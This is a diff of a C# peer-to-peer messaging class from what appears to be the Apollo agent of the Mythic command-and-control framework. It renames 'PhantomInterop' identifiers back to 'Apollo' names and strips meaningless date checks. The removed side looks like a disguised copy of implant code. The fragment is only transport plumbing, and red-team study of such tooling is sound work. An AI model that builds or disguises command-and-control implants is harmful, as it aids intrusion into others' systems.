@@ -1,18 +1,18 @@
-﻿using PhantomInterop.Classes.Core;
-using PhantomInterop.Classes.Events;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Serializers;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Utils;
+﻿using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Events;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Serializers;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Utils;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Text;
 using System.Threading;
 
-namespace PhantomInterop.Classes.P2P
+namespace ApolloInterop.Classes.P2P
 {
     public abstract class Peer : IPeer
     {
@@ -24,9 +24,9 @@ namespace PhantomInterop.Classes.P2P
         protected string _mythicUUID;
         protected bool _previouslyConnected;
         public event EventHandler<UUIDEventArgs> UUIDNegotiated;
-        protected ConcurrentDictionary<string, ChunkStore<DataChunk>> _messageOrganizer = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
-        protected ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
-        protected AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
+        protected ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> _messageOrganizer = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
+        protected ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        protected AutoResetEvent _senderEvent = new AutoResetEvent(false);
         protected MessageType _serverResponseType;
 
         public event EventHandler<EventArgs> ConnectionEstablished;
@@ -41,7 +41,7 @@ namespace PhantomInterop.Classes.P2P
             _previouslyConnected = false;
             if (serializer == null)
             {
-                _serializer = new JsonHandler();
+                _serializer = new JsonSerializer();
             }
         }
         protected virtual void OnUUIDNegotiated(object sender, UUIDEventArgs args)
@@ -75,11 +75,11 @@ namespace PhantomInterop.Classes.P2P
                 OnUUIDNegotiated(this, new UUIDEventArgs(_mythicUUID));
                 _uuid = _mythicUUID;
             }
-            _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(message.Message));
-            _msgSendEvent.Set();
+            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(message.Message));
+            _senderEvent.Set();
         }
 
-        public void DeserializeToReceiver(object sender, ChunkEventData<DataChunk> args)
+        public void DeserializeToReceiver(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -88,11 +88,11 @@ namespace PhantomInterop.Classes.P2P
             {
                 data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
             }
-            
-            
+            // Probably where we do sorting based on EKE,
+            // checkin, and get_tasking
             switch (mt)
             {
-                
+                // part of the checkin process, flag next message to be of EKE
                 case MessageType.EKEHandshakeMessage:
                     _serverResponseType = MessageType.EKEHandshakeResponse;
                     break;
@@ -108,8 +108,8 @@ namespace PhantomInterop.Classes.P2P
             });
         }
 
-        public virtual string GetUUID() { if(DateTime.Now.Year > 2020) { return _uuid; } else { return null; } }
-        public virtual string GetMythicUUID() { if(DateTime.Now.Year > 2020) { return _mythicUUID; } else { return null; } }
+        public virtual string GetUUID() { return _uuid; }
+        public virtual string GetMythicUUID() { return _mythicUUID; }
         public abstract bool Finished();
 
 
